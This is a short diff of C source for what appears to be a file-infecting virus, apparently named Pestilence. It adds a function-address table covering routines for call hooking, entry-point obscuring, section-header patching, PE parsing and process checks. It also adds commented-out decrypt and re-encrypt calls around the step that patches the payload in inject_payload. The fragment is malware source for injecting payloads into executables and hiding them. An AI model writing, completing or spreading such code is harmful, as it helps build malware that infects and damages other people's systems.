@@ -6,6 +6,19 @@ static void	init_info(t_info *info)
 	info->text_size = 0;
 	info->valid_target = 1;
 	info->in_pestilence = 0;
+
+	info->tab_addr[0] = (size_t)&update_index;
+	info->tab_addr[1] = (size_t)&check_magic;
+	info->tab_addr[2] = (size_t)&get_padding_size;
+	info->tab_addr[3] = (size_t)&valid_call;
+	info->tab_addr[4] = (size_t)&patch_sections_header;
+	info->tab_addr[5] = (size_t)&find_text;
+	info->tab_addr[6] = (size_t)&hook_call;
+	info->tab_addr[7] = (size_t)&patch_close_entries;
+	info->tab_addr[8] = (size_t)&epo_parsing;
+	info->tab_addr[9] = (size_t)&pe_parsing;
+	info->tab_addr[10] = (size_t)&parse_process;
+	info->tab_addr[11] = (size_t)&check_process;
 }
 
 
@@ -16,7 +29,9 @@ static void	inject_payload(t_info *info)
 	addr = &ft_memcpy;
 	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
 	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
+// 	uint32_t key = decrypt_func(info, &patch_payload, 0xcd, 1);
 	patch_payload(info);
+// 	reencrypt_func(info, &patch_payload, 0xcd, key);
 }
 
 
